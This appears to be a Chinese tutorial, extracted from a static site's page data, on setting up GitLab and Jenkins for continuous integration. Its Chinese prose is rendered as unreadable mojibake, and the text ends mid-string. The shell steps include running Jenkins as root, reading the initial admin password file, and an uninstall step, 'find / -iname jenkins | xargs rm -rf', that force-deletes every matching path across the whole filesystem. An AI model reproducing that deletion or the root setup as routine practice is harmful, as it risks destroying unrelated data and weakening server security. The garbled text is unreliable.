ç«¯å£\n\n5. è·åå¹¶è¾å¥ admin è´¦æ·å¯ç \n\ncat /var/lib/jenkins/secrets/initialAdminPassword\n\n\n1\n\n\n6. æ·»å ä¸ä¸ªç®¡çåè´¦æ·ï¼å¹¶è¿å¥ Jenkins åå°\n\n7. è·³è¿æä»¶å®è£\nå ä¸º Jenkins æä»¶éè¦è¿æ¥é»è®¤å®ç½ä¸è½½ï¼éåº¦éå¸¸æ¢ï¼èä¸ç»è¿ä¼å¤±è´¥ï¼æä»¥æä»¬ææ¶åè·³è¿æä»¶å®è£\n\n\n\n\n\n\n\n\n\n\n\n\n# jenkins æä»¶ç®¡ç\n\nJenkins æ¬èº«ä¸æä¾å¾å¤åè½ï¼æä»¬å¯ä»¥éè¿ä½¿ç¨æä»¶æ¥æ»¡è¶³æä»¬çä½¿ç¨ãä¾å¦ä» Gitlab æåä»£ç ï¼ä½¿ç¨ Maven æå»ºé¡¹ç®ç­åè½éè¦ä¾é æä»¶å®æãæ¥ä¸æ¥æ¼ç¤ºå¦ä½ä¸è½½æä»¶ã\n\n\n# ä¿®æ¹ Jenkins æä»¶ä¸è½½å°å\n\nJenkins å½å¤å®æ¹æä»¶å°åä¸è½½éåº¦éå¸¸æ¢ï¼æä»¥å¯ä»¥ä¿®æ¹ä¸ºå½åæä»¶å°åï¼Jenkins->Manage Jenkins->Manage Pluginsï¼ç¹å» Available\n\n\n\n\n\nsystemctl restart jenkins\n\n\n1\n\n\n\n\næ­¤æ¶æä»¬å¯ä»¥è¿å¥ /var/lib/jenkins/updatesï¼çå°æä¸ª default.jsonï¼è¿ä¸ªæä»¶éé¢æ¯æææä»¶çå°åï¼è¿éé¢çå°åç®åå¨æ¯å½å¤çå°åï¼å¯ä»¥ç¨ä»¥ä¸å½ä»¤è¿è¡æ¿æ¢å°å½åå°åã\n\nsed -i \'s/http:\\/\\/updates.jenkinsci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\' default.json && sed -i \'s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\' default.json\n\n\n1\n\n\næåï¼Manage Plugins ç¹å» Advancedï¼æ Update Site æ¹ä¸ºå½åæä»¶ä¸è½½å°å\n\n> https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\n\n\n\n\n\néå¯ jenkins ï¼å¨è®¿é®è·¯å¾åé¢é®å¥ restart å³å¯ã\n\nhttp://192.168.81.102:7777/restart\n\n\n1\n\n\néå¯å¥½åï¼æä»¬è¿è¡å¯¹ jenkins è¿è¡æ±åã\n\n\n\n\n\n> jenkins çæ¬æ´æ°å¤ªå¿«ï¼åæ¬æ ¸å¿åºä¹ä¼æ´æ°ï¼å¤§å®¶å¯ä»¥æ¾å¿æ´æ°ï¼ä¸ç¨æï¼æå¤å°±æ¯èµ·ä¸æ¥éè£ã\n\n\n# Jenkins å¸è½½\n\nååæ­¢ Jenkins çè¿è¡\n\n# æ¹å¼ä¸\nsystemctl stop jenkins\n# æ¹å¼äº\nservice jenkins stop\n\n\n1\n2\n3\n4\n\n\næ¾å°ææè· Jenkins ç¸å³çå\n\nrpm -qc jenkins\n\n\n1\n\n\nå¸è½½ç¸å³å\n\nrpm -e jenkins\n\n\n1\n\n\næ£æ¥æ¯å¦å¸è½½æå\n\nrpm -ql jenkins\n\n\n1\n\n\nå é¤åä¸æä»¶\n\nfind / -iname jenkins | xargs -n 1000 rm -rf\n\n\n1\n',normalizedContent:'# æç»­éææµç¨è¯´æ\n\n\n\n1. é¦åï¼å¼åäººåæ¯å¤©è¿è¡ä»£ç æäº¤ï¼æäº¤å° git ä»åº\n2. ç¶åï¼jenkins ä½ä¸ºæç»­éæå·¥å·ï¼ä½¿ç¨ git å·¥å·å° git ä»åºæåä»£ç å°éææå¡å¨ï¼åéå jdkï¼maven ç­è½¯ä»¶å®æä»£ç ç¼è¯ï¼ä»£ç æµè¯ä¸å®¡æ¥ï¼æµè¯ï¼æåç­å·¥ä½ï¼å¨è¿ä¸ªè¿ç¨ä¸­æ¯ä¸æ­¥åºéï¼é½éæ°åæ§è¡ä¸æ¬¡æ´ä¸ªæµç¨ã\n3. æåï¼jenkins æçæç jar æ war åååå°æµè¯æå¡å¨æèçäº§æå¡å¨ï¼æµè¯äººåæç¨æ·å°±å¯ä»¥è®¿é®åºç¨ã\n\næå¡å¨åè¡¨\n\nåç§°         ip å°å            å®è£çè½¯ä»¶\nä»£ç æç®¡æå¡å¨    192.168.66.100   gitlab-12.4.2\næç»­éææå¡å¨    192.168.66.101   jenkins-2.190.3ï¼jdk1.8ï¼maven3.6.2ï¼gitï¼sonarqube\næµè¯æçäº§æå¡å¨   192.168.66.102   jdk1.8ï¼tomcat8.5\n\n\n# gitlab ä»£ç æç®¡æå¡å¨å®è£\n\n\n# gitlab ç®ä»\n\nå®ç½ï¼ https://about.gitlab.com/\n\ngitlab æ¯ä¸ä¸ªç¨äºä»åºç®¡çç³»ç»çå¼æºé¡¹ç®ï¼ä½¿ç¨ git ä½ä¸ºä»£ç ç®¡çå·¥å·ï¼å¹¶å¨æ­¤åºç¡ä¸æ­å»ºèµ·æ¥ç web æå¡ã\n\ngitlab å github ä¸æ ·å±äºç¬¬ä¸æ¹åºäº git å¼åçä½åï¼åè´¹ä¸å¼æºï¼åºäº mit åè®®ï¼ï¼ä¸ github ç±»ä¼¼ï¼å¯ä»¥æ³¨åç¨æ·ï¼ä»»ææäº¤ä½ çä»£ç ï¼æ·»å  sshkey ç­ç­ãä¸åçæ¯ï¼gitlab æ¯å¯ä»¥é¨ç½²å°èªå·±çæå¡å¨ä¸ï¼æ°æ®åºç­ä¸åä¿¡æ¯é½ææ¡å¨èªå·±æä¸ï¼éåå¢éåé¨åä½å¼åï¼ä½ æ»ä¸å¯è½æå¢éåé¨çæºæ§æ»æ¾å¨å«äººçæå¡å¨ä¸å§ï¼ç®åæ¥è¯´å¯æ gitlab çä½ä¸ªäººçç githubã\n\n\n# gitlab å®è£\n\n1. å®è£ç¸å³ä¾èµ\n\nyum -y install policycoreutils openssh-server openssh-clients postfix\n\n\n1\n\n\n2. å¯å¨ ssh æå¡ & è®¾ç½®ä¸ºå¼æºå¯å¨\n\nsystemctl enable sshd && sudo systemctl start sshd\n\n\n1\n\n\n3. è®¾ç½® postfix å¼æºèªå¯ï¼å¹¶å¯å¨ï¼postfix æ¯æ gitlab åä¿¡åè½\n\nsystemctl enable postfix && systemctl start postfix\n\n\n1\n\n\n4. å¼æ¾ ssh ä»¥å http æå¡ï¼ç¶åéæ°å è½½é²ç«å¢åè¡¨\n\nfirewall-cmd --add-service=ssh --permanent\nfirewall-cmd --add-service=http --permanent\nfirewall-cmd --reload\n\n\n1\n2\n3\n\n\n> å¦æå³é­é²ç«å¢å°±ä¸éè¦åä»¥ä¸éç½®\n\n5. ä¸è½½ gitlab åï¼å¹¶ä¸å®è£\nå¨çº¿ä¸è½½å®è£åï¼\n\nwget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n# å®è£\nrpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n\n\n1\n2\n3\n\n\n6. ä¿®æ¹ gitlab éç½®\n\nvi /etc/gitlab/gitlab.rb\n# ä¿®æ¹gitlabè®¿é®å°ååç«¯å£ï¼é»è®¤ä¸º80ï¼æä»¬æ¹ä¸º82\nexternal_url \'http://192.168.66.100:82\'\nnginx[\'listen_port\'] = 82\n\n\n1\n2\n3\n4\n\n 7. éè½½éç½®åå¯å¨ gitlab\n\ngitlab-ctl reconfigure\ngitlab-ctl restart\n\n\n1\n2\n\n\n8. æç«¯å£æ·»å å°é²ç«å¢\n\nfirewall-cmd --zone=public --add-port=82/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n\nå¯å¨æååï¼çå°ä»¥ä¸ä¿®æ¹ç®¡çå root å¯ç çé¡µé¢ï¼ä¿®æ¹å¯ç åï¼ç¶åç»å½å³å¯\n\n\n# gitlab æ·»å ç»ãåå»ºç¨æ·ãåå»ºé¡¹ç®\n\n1. åå»ºç»\nä½¿ç¨ç®¡çå root åå»ºç»ï¼ä¸ä¸ªç»éé¢å¯ä»¥æå¤ä¸ªé¡¹ç®åæ¯ï¼å¯ä»¥å°å¼åæ·»å å°ç»éé¢è¿è¡è®¾ç½®æéï¼ä¸åçç»å°±æ¯å¬å¸ä¸åçå¼åé¡¹ç®æèæå¡æ¨¡åï¼ä¸åçç»æ·»å ä¸åçå¼åå³å¯å®ç°å¯¹å¼åè®¾ç½®æéçç®¡ç\n\n2. åå»ºç¨æ·\nåå»ºç¨æ·çæ¶åï¼å¯ä»¥éæ© regular æ admin ç±»åãåå»ºå®ç¨æ·åï¼ç«å³ä¿®æ¹å¯ç \n\n3. å°ç¨æ·æ·»å å°ç»ä¸­\néæ©æä¸ªç¨æ·ç»ï¼è¿è¡ members ç®¡çç»çæå\n\ngitlab ç¨æ·å¨ç»éé¢æ 5 ç§ä¸åæéï¼\n\n * guestï¼å¯ä»¥åå»º issueãåè¡¨è¯è®ºï¼ä¸è½è¯»åçæ¬åº reporterï¼å¯ä»¥åéä»£ç ï¼ä¸è½æäº¤ï¼qaãpm å¯ä»¥èµäºè¿ä¸ªæé\n * developerï¼å¯ä»¥åéä»£ç ãå¼åãæäº¤ãpushï¼æ®éå¼åå¯ä»¥èµäºè¿ä¸ªæé\n * maintainerï¼å¯ä»¥åå»ºé¡¹ç®ãæ·»å  tagãä¿æ¤åæ¯ãæ·»å é¡¹ç®æåãç¼è¾é¡¹ç®ï¼æ ¸å¿å¼åå¯ä»¥èµäºè¿ä¸ªæé\n * ownerï¼å¯ä»¥è®¾ç½®é¡¹ç®è®¿é®æé - visibility levelãå é¤é¡¹ç®ãè¿ç§»é¡¹ç®ãç®¡çç»æåï¼å¼åç»ç»é¿å¯ä»¥èµäºè¿ä¸ªæé\n\n4. å¨ç¨æ·ç»ä¸­åå»ºé¡¹ç®\nä»¥åæåå»ºçæ°ç¨æ·èº«ä»½ç»å½å° gitlabï¼ç¶åå¨ç¨æ·ç»ä¸­åå»ºæ°çé¡¹ç®\n\n\n# jenkins å®è£\n\n1. è·å jenkins å®è£åï¼ä¸è½½é¡µé¢ï¼http://mirrors.jenkins-ci.org/redhat/\n\n# å½åç¯å¢ä¸æ¯é£ä¹å¥½ï¼ä¸è½½è¦ç§å­¦\nwget http://mirrors.jenkins-ci.org/redhat/jenkins-2.190.3-1.1.noarch.rpm\n# å®è£\nrpm -ivh jenkins-2.190.3-1.1.noarch.rpm\n\n\n1\n2\n3\n4\n\n\n2. ä¿®æ¹ jenkins éç½®\n\nvim /etc/sysconfig/jenkins\n# ä¿®æ¹åå®¹å¦ä¸\n# è½æ§è¡jenkinsçç¨æ·æé\njenkins_user="root" \n# é¡µé¢è®¿é®ç«¯å£\njenkins_port="7777" \n\n\n1\n2\n3\n4\n5\n6\n\n\n3. å¯å¨ jenkins\n\nsystemctl start jenkins\n\n\n1\n\n\n> æ¥é\n> starting jenkins bash: /usr/bin/java: æ²¡æé£ä¸ªæä»¶æç®å½\n> failed to start lsb: jenkins automation server.\n> æ¯å ä¸º jenkins åé¨èªå·±éç½®äº java å°åï¼éè¦æ¹ä¸ä¸ã\n> vim /etc/init.d/jenkins\n> /usr/bin/java æ¾å°ï¼å¹¶æ¹æèªå·±ç java å°åï¼æçæ¯ /opt/software/java8/jre/bin/javaï¼æ³¨æè¿éæ¾çæ¯ jre çã\n> æ§è¡ systemctl daemon-reloadï¼å¨æ§è¡ systemctl start jenkins\n\n> ææ°çæ¬ jenkins 2.346.1 åä¹åçæ¬è¿æ¯æä¸ä¸æ ·çå°æ¹ï¼è¿éåªè¯´å ä¸ª jenkins 2.346.1 éå°çæ¥éï¼\n> 1 aug 16 14:19:14 host-10-240-30-93 jenkins [31531]: jenkins: failed to find a valid java installation è¿ç§æ¥éä¸ç´è¯´æ¯æ²¡å®è£ javaï¼ä½æ¯ææææç§ä»¥ä¸æ¹å¼é½éç½®è¿äºï¼æç»è§£å³æ¹å¼å°±æ¯ç¼è¾ vim /usr/lib/systemd/system/jenkins.service æä»¶ï¼æ¾å°è¢«æ³¨éç environment="java_home="ï¼æèªå·±ç java è·¯å¾åä¸ï¼å¦ /opt/software/jdk\n> 2 aug 16 14:26:42 host-10-240-30-93 jenkins [10782]: java.net.bindexception: address already in use ä½ ä¼åç°å¨ vim /etc/sysconfig/jenkins æä»¶é½æ¹è¿äºï¼ä½è¿æ¯ç«¯å£å ç¨ï¼ä¾ç¶éè¦ä¿®æ¹ vim /usr/lib/systemd/system/jenkins.service æä»¶ï¼å¹¶ç¼è¾ environment="jenkins_port=7777" æ¹æèªå·±éè¦çç«¯å£\n> 3 aug 16 14:28:37 host-10-240-30-93 jenkins [20925]: caused: java.io.ioexception: failed to start jetty æ£æ¥ææéç½®åæ¬ /etc/sysconfig/jenkins å /usr/lib/systemd/system/jenkins.serviceï¼å´æ¥éç½®æ­£ç¡®\n> 4 aug 16 14:44:10 host-10-240-30-93 jenkins [12516]: jenkins: invalid java version: java version "17.0.3.1" 2022-04-22 lts java çæ¬è¿é«æè¿ä½å¯¼è´ï¼æç¨ java17 æ 11 ç´æ¥ä¸è¡ï¼æ¢æ 8 å°±å¥½äº\n\n4. æå¼æµè§å¨è®¿é®\nhttp://192.168.66.101:7777\n\n> æ³¨æï¼æ¬æå¡å¨æé²ç«å¢å³é­äºï¼å¦æå¼å¯é²ç«å¢ï¼éè¦å¨é²ç«å¢æ·»å ç«¯å£\n\n5. è·åå¹¶è¾å¥ admin è´¦æ·å¯ç \n\ncat /var/lib/jenkins/secrets/initialadminpassword\n\n\n1\n\n\n6. æ·»å ä¸ä¸ªç®¡çåè´¦æ·ï¼å¹¶è¿å¥ jenkins åå°\n\n7. è·³è¿æä»¶å®è£\nå ä¸º jenkins æä»¶éè¦è¿æ¥é»è®¤å®ç½ä¸è½½ï¼éåº¦éå¸¸æ¢ï¼èä¸ç»è¿ä¼å¤±è´¥ï¼æä»¥æä»¬ææ¶åè·³è¿æä»¶å®è£\n\n\n\n\n\n\n\n\n\n\n\n\n# jenkins æä»¶ç®¡ç\n\njenkins æ¬èº«ä¸æä¾å¾å¤åè½ï¼æä»¬å¯ä»¥éè¿ä½¿ç¨æä»¶æ¥æ»¡è¶³æä»¬çä½¿ç¨ãä¾å¦ä» gitlab æåä»£ç ï¼ä½¿ç¨ maven æå»ºé¡¹ç®ç­åè½éè¦ä¾é æä»¶å®æãæ¥ä¸æ¥æ¼ç¤ºå¦ä½ä¸è½½æä»¶ã\n\n\n# ä¿®æ¹ jenkins æä»¶ä¸è½½å°å\n\njenkins å½å¤å®æ¹æä»¶å°åä¸è½½éåº¦éå¸¸æ¢ï¼æä»¥å¯ä»¥ä¿®æ¹ä¸ºå½åæä»¶å°åï¼jenkins->manage jenkins->manage pluginsï¼ç¹å» available\n\n\n\n\n\nsystemctl restart jenkins\n\n\n1\n\n\n\n\næ­¤æ¶æä»¬å¯ä»¥è¿å¥ /var/lib/jenkins/updatesï¼çå°æä¸ª default.jsonï¼è¿ä¸ªæä»¶éé¢æ¯æææä»¶çå°åï¼è¿éé¢çå°åç®åå¨æ¯å½å¤çå°åï¼å¯ä»¥ç¨ä»¥ä¸å½ä»¤è¿è¡æ¿æ¢å°å½åå°åã\n\nsed -i \'s/http:\\/\\/updates.jenkinsci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\' default.json && sed -i \'s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\' default.json\n\n\n1\n\n\næåï¼manage plugins ç¹å» advancedï¼æ update site æ¹ä¸ºå½åæä»¶ä¸è½½å°å\n\n> https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\n\n\n\n\n\néå¯ jenkins ï¼å¨è®¿é®è·¯å¾åé¢é®å¥ restart å³å¯ã\n\nhttp://192.168.81.102:7777/restart\n\n\n1\n\n\néå¯å¥½åï¼æä»¬è¿è¡å¯¹ jenkins è¿è¡æ±åã\n\n\n\n\n\n> jenkins çæ¬æ´æ°å¤ªå¿«ï¼åæ¬æ ¸å¿åºä¹ä¼æ´æ°ï¼å¤§å®¶å¯ä»¥æ¾å¿æ´æ°ï¼ä¸ç¨æï¼æå¤å°±æ¯èµ·ä¸æ¥éè£ã\n\n\n# jenkins å¸è½½\n\nååæ­¢ jenkins çè¿è¡\n\n# æ¹å¼ä¸\nsystemctl stop jenkins\n# æ¹å¼äº\nservice jenkins stop\n\n\n1\n2\n3\n4\n\n\næ¾å°ææè· jenkins ç¸å³çå\n\nrpm -qc jenkins\n\n\n1\n\n\nå¸è½½ç¸å³å\n\nrpm -e jenkins\n\n\n1\n\n\næ£æ¥æ¯å¦å¸è½½æå\n\nrpm -ql jenkins\n\n\n1\n\n\nå é¤åä¸æä»¶\n\nfind / -iname jenkins | xargs -n 1000 rm -rf\n\n\n1\n',charsets:{cjk:!0}},{title:"Jenkins(ä¸) æç»­éæåJenkinsä»ç»",frontmatter:{title:"Jenkins(ä¸) æç»­éæåJenkinsä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/500",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/500.Jenkins(%E4%B8%80)%20%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%8F%8AJenkins%E4%BB%8B%E7%BB%8D.html",relativePath:"01.è¿ç»´/50.Jenkins/500.Jenkins(ä¸) æç»­éæåJenkinsä»ç».md",key:"v-16683504",path:"/jenkins/500/",headers:[{level:2,title:"ä»ä¹æ¯æç»­éæ",slug:"ä»ä¹æ¯æç»­éæ",normalizedTitle:"ä»ä¹æ¯æç»­éæ",charIndex:2},{level:3,title:"æç»­éæçç»æè¦ç´ ",slug:"æç»­éæçç»æè¦ç´ ",normalizedTitle:"æç»­éæçç»æè¦ç´ ",charIndex:720},{level:3,title:"æç»­éæçå¥½å¤",slug:"æç»­éæçå¥½å¤",normalizedTitle:"æç»­éæçå¥½å¤",charIndex:902},{level:2,title:"Jenkinsä»ç»",slug:"jenkinsä»ç»",normalizedTitle:"jenkins ä»ç»",charIndex:1039}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä»ä¹æ¯æç»­éæ æç»­éæçç»æè¦ç´  æç»­éæçå¥½å¤ Jenkinsä»ç»",content:"# ä»ä¹æ¯æç»­éæ\n\næç»­éæï¼ Continuous integration ï¼ ç®ç§° CI ï¼æçæ¯ï¼é¢ç¹å°ï¼ä¸å¤©å¤æ¬¡ï¼å°ä»£ç éæå°ä¸»å¹²ã\n\næç»­éæçç®çï¼å°±æ¯è®©äº§åå¯ä»¥å¿«éè¿­ä»£ï¼åæ¶è¿è½ä¿æé«è´¨éãå®çæ ¸å¿æªæ½æ¯ï¼ä»£ç éæå°ä¸»å¹²ä¹åï¼å¿é¡»éè¿èªå¨åæµè¯ãåªè¦æä¸ä¸ªæµè¯ç¨ä¾å¤±è´¥ï¼å°±ä¸è½éæã\n\néè¿æç»­éæï¼ å¢éå¯ä»¥å¿«éçä»ä¸ä¸ªåè½å°å¦ä¸ä¸ªåè½ï¼ç®èè¨ä¹ï¼ææ·è½¯ä»¶å¼åå¾å¤§ä¸é¨åé½è¦å½åäºæç»­éæã\n\n\n\næ ¹æ®æç»­éæçè®¾è®¡ï¼ä»£ç ä»æäº¤å°çäº§ï¼æ´ä¸ªè¿ç¨æä»¥ä¸å æ­¥ã\n\n * æäº¤\n   æµç¨çç¬¬ä¸æ­¥ï¼æ¯å¼åèåä»£ç ä»åºæäº¤ä»£ç ãææåé¢çæ­¥éª¤é½å§äºæ¬å°ä»£ç çä¸æ¬¡æäº¤ï¼commitï¼ã\n * æµè¯ï¼ç¬¬ä¸è½®ï¼\n   ä»£ç ä»åºå¯¹ commit æä½éç½®äºé©å­ï¼hookï¼ï¼åªè¦æäº¤ä»£ç æèåå¹¶è¿ä¸»å¹²ï¼å°±ä¼è·èªå¨åæµè¯ã\n * æå»º\n   éè¿ç¬¬ä¸è½®æµè¯ï¼ä»£ç å°±å¯ä»¥åå¹¶è¿ä¸»å¹²ï¼å°±ç®å¯ä»¥äº¤ä»äºã\n   äº¤ä»åï¼å°±åè¿è¡æå»ºï¼buildï¼ï¼åè¿å¥ç¬¬äºè½®æµè¯ãæè°æå»ºï¼æçæ¯å°æºç è½¬æ¢ä¸ºå¯ä»¥è¿è¡çå®éä»£ç ï¼æ¯å¦å®è£ä¾èµï¼éç½®åç§èµæºï¼æ ·å¼è¡¨ãJS èæ¬ãå¾çï¼ç­ç­ã\n * æµè¯ï¼ç¬¬äºè½®ï¼\n   æå»ºå®æï¼å°±è¦è¿è¡ç¬¬äºè½®æµè¯ãå¦æç¬¬ä¸è½®å·²ç»æ¶µçäºæææµè¯åå®¹ï¼ç¬¬äºè½®å¯ä»¥çç¥ï¼å½ç¶ï¼è¿æ¶æå»ºæ­¥éª¤ä¹è¦ç§»å°ç¬¬ä¸è½®æµè¯åé¢ã\n * é¨ç½²\n   è¿äºç¬¬äºè½®æµè¯ï¼å½åä»£ç å°±æ¯ä¸ä¸ªå¯ä»¥ç´æ¥é¨ç½²ççæ¬ï¼artifactï¼ãå°è¿ä¸ªçæ¬çæææä»¶æåï¼tar filename.tar * ï¼å­æ¡£ï¼åå°çäº§æå¡å¨ã\n * åæ»\n   ä¸æ¦å½åçæ¬åçé®é¢ï¼å°±è¦åæ»å°ä¸ä¸ä¸ªçæ¬çæå»ºç»æãæç®åçåæ³å°±æ¯ä¿®æ¹ä¸ä¸ç¬¦å·é¾æ¥ï¼æåä¸ä¸ä¸ªçæ¬çç®å½ã\n\n\n# æç»­éæçç»æè¦ç´ \n\n * ä¸ä¸ªèªå¨æå»ºè¿ç¨ï¼ ä»æ£åºä»£ç ã ç¼è¯æå»ºã è¿è¡æµè¯ã ç»æè®°å½ã æµè¯ç»è®¡ç­é½æ¯èªå¨å®æçï¼ æ éäººå·¥å¹²é¢ã\n * ä¸ä¸ªä»£ç å­å¨åºï¼å³éè¦çæ¬æ§å¶è½¯ä»¶æ¥ä¿éä»£ç çå¯ç»´æ¤æ§ï¼åæ¶ä½ä¸ºæå»ºè¿ç¨çç´ æåºï¼ä¸è¬ä½¿ç¨ SVN æ Gitã\n * ä¸ä¸ªæç»­éææå¡å¨ï¼ Jenkins å°±æ¯ä¸ä¸ªéç½®ç®ååä½¿ç¨æ¹ä¾¿çæç»­éææå¡å¨ã\n\n\n\n\n# æç»­éæçå¥½å¤\n\n1ãéä½é£é©ï¼ç±äºæç»­éæä¸æ­å»æå»ºï¼ç¼è¯åæµè¯ï¼å¯ä»¥å¾æ©æåç°é®é¢ï¼æä»¥ä¿®å¤çä»£ä»·å°±å°ï¼\n2ãå¯¹ç³»ç»å¥åº·æç»­æ£æ¥ï¼åå°åå¸é£é©å¸¦æ¥çé®é¢ï¼\n3ãåå°éå¤æ§å·¥ä½ï¼\n4ãæç»­é¨ç½²ï¼æä¾å¯é¨ç½²åååï¼\n5ãæç»­äº¤ä»å¯ä¾ä½¿ç¨ççæ¬ï¼\n6ãå¢å¼ºå¢éä¿¡å¿ï¼\n\n\n# Jenkins ä»ç»\n\nJenkins æ¯ä¸æ¬¾æµè¡çå¼æºæç»­éæï¼Continuous Integrationï¼å·¥å·ï¼å¹¿æ³ç¨äºé¡¹ç®å¼åï¼å·æèªå¨åæå»ºãæµè¯åé¨ç½²ç­åè½ãå®ç½ï¼ http://jenkins-ci.org/ã\n\nJenkins çç¹å¾ï¼\n\n * å¼æºç Java è¯­è¨å¼åæç»­éæå·¥å·ï¼æ¯ææç»­éæï¼æç»­é¨ç½²ã\n * æäºå®è£é¨ç½²éç½®ï¼å¯éè¿ yum å®è£ï¼æä¸è½½ war åä»¥åéè¿ docker å®¹å¨ç­å¿«éå®ç°å®è£é¨ç½²ï¼å¯æ¹ä¾¿ web çé¢éç½®ç®¡çã\n * æ¶æ¯éç¥åæµè¯æ¥åï¼éæ RSS/E-mail éè¿ RSS åå¸æå»ºç»ææå½æå»ºå®ææ¶éè¿ e-mail éç¥ï¼çæ JUnit/TestNG æµè¯æ¥åã\n * åå¸å¼æå»ºï¼æ¯æ Jenkins è½å¤è®©å¤å°è®¡ç®æºä¸èµ·æå»º / æµè¯ã\n * æä»¶è¯å«ï¼Jenkins è½å¤è·è¸ªåªæ¬¡æå»ºçæåªäº jarï¼åªæ¬¡æå»ºä½¿ç¨åªä¸ªçæ¬ç jar ç­ã\n * ä¸°å¯çæä»¶æ¯æï¼æ¯ææ©å±æä»¶ï¼ä½ å¯ä»¥å¼åéåèªå·±å¢éä½¿ç¨çå·¥å·ï¼å¦ gitï¼svnï¼mavenï¼docker ç­ã",normalizedContent:"# ä»ä¹æ¯æç»­éæ\n\næç»­éæï¼ continuous integration ï¼ ç®ç§° ci ï¼æçæ¯ï¼é¢ç¹å°ï¼ä¸å¤©å¤æ¬¡ï¼å°ä»£ç éæå°ä¸»å¹²ã\n\næç»­éæçç®çï¼å°±æ¯è®©äº§åå¯ä»¥å¿«éè¿­ä»£ï¼åæ¶è¿è½ä¿æé«è´¨éãå®çæ ¸å¿æªæ½æ¯ï¼ä»£ç éæå°ä¸»å¹²ä¹åï¼å¿é¡»éè¿èªå¨åæµè¯ãåªè¦æä¸ä¸ªæµè¯ç¨ä¾å¤±è´¥ï¼å°±ä¸è½éæã\n\néè¿æç»­éæï¼ å¢éå¯ä»¥å¿«éçä»ä¸ä¸ªåè½å°å¦ä¸ä¸ªåè½ï¼ç®èè¨ä¹ï¼ææ·è½¯ä»¶å¼åå¾å¤§ä¸é¨åé½è¦å½åäºæç»­éæã\n\n\n\næ ¹æ®æç»­éæçè®¾è®¡ï¼ä»£ç ä»æäº¤å°çäº§ï¼æ´ä¸ªè¿ç¨æä»¥ä¸å æ­¥ã\n\n * æäº¤\n   æµç¨çç¬¬ä¸æ­¥ï¼æ¯å¼åèåä»£ç ä»åºæäº¤ä»£ç ãææåé¢çæ­¥éª¤é½å§äºæ¬å°ä»£ç çä¸æ¬¡æäº¤ï¼commitï¼ã\n * æµè¯ï¼ç¬¬ä¸è½®ï¼\n   ä»£ç ä»åºå¯¹ commit æä½éç½®äºé©å­ï¼hookï¼ï¼åªè¦æäº¤ä»£ç æèåå¹¶è¿ä¸»å¹²ï¼å°±ä¼è·èªå¨åæµè¯ã\n * æå»º\n   éè¿ç¬¬ä¸è½®æµè¯ï¼ä»£ç å°±å¯ä»¥åå¹¶è¿ä¸»å¹²ï¼å°±ç®å¯ä»¥äº¤ä»äºã\n   äº¤ä»åï¼å°±åè¿è¡æå»ºï¼buildï¼ï¼åè¿å¥ç¬¬äºè½®æµè¯ãæè°æå»ºï¼æçæ¯å°æºç è½¬æ¢ä¸ºå¯ä»¥è¿è¡çå®éä»£ç ï¼æ¯å¦å®è£ä¾èµï¼éç½®åç§èµæºï¼æ ·å¼è¡¨ãjs èæ¬ãå¾çï¼ç­ç­ã\n * æµè¯ï¼ç¬¬äºè½®ï¼\n   æå»ºå®æï¼å°±è¦è¿è¡ç¬¬äºè½®æµè¯ãå¦æç¬¬ä¸è½®å·²ç»æ¶µçäºæææµè¯åå®¹ï¼ç¬¬äºè½®å¯ä»¥çç¥ï¼å½ç¶ï¼è¿æ¶æå»ºæ­¥éª¤ä¹è¦ç§»å°ç¬¬ä¸è½®æµè¯åé¢ã\n * é¨ç½²\n   è¿äºç¬¬äºè½®æµè¯ï¼å½åä»£ç å°±æ¯ä¸ä¸ªå¯ä»¥ç´æ¥é¨ç½²ççæ¬ï¼artifactï¼ãå°è¿ä¸ªçæ¬çæææä»¶æåï¼tar filename.tar * ï¼å­æ¡£ï¼åå°çäº§æå¡å¨ã\n * åæ»\n   ä¸æ¦å½åçæ¬åçé®é¢ï¼å°±è¦åæ»å°ä¸ä¸ä¸ªçæ¬çæå»ºç»æãæç®åçåæ³å°±æ¯ä¿®æ¹ä¸ä¸ç¬¦å·é¾æ¥ï¼æåä¸ä¸ä¸ªçæ¬çç®å½ã\n\n\n# æç»­éæçç»æè¦ç´ \n\n * ä¸ä¸ªèªå¨æå»ºè¿ç¨ï¼ ä»æ£åºä»£ç ã ç¼è¯æå»ºã è¿è¡æµè¯ã ç»æè®°å½ã æµè¯ç»è®¡ç­é½æ¯èªå¨å®æçï¼ æ éäººå·¥å¹²é¢ã\n * ä¸ä¸ªä»£ç å­å¨åºï¼å³éè¦çæ¬æ§å¶è½¯ä»¶æ¥ä¿éä»£ç çå¯ç»´æ¤æ§ï¼åæ¶ä½ä¸ºæå»ºè¿ç¨çç´ æåºï¼ä¸è¬ä½¿ç¨ svn æ gitã\n * ä¸ä¸ªæç»­éææå¡å¨ï¼ jenkins å°±æ¯ä¸ä¸ªéç½®ç®ååä½¿ç¨æ¹ä¾¿çæç»­éææå¡å¨ã\n\n\n\n\n# æç»­éæçå¥½å¤\n\n1ãéä½é£é©ï¼ç±äºæç»­éæä¸æ­å»æå»ºï¼ç¼è¯åæµè¯ï¼å¯ä»¥å¾æ©æåç°é®é¢ï¼æä»¥ä¿®å¤çä»£ä»·å°±å°ï¼\n2ãå¯¹ç³»ç»å¥åº·æç»­æ£æ¥ï¼åå°åå¸é£é©å¸¦æ¥çé®é¢ï¼\n3ãåå°éå¤æ§å·¥ä½ï¼\n4ãæç»­é¨ç½²ï¼æä¾å¯é¨ç½²åååï¼\n5ãæç»­äº¤ä»å¯ä¾ä½¿ç¨ççæ¬ï¼\n6ãå¢å¼ºå¢éä¿¡å¿ï¼\n\n\n# jenkins ä»ç»\n\njenkins 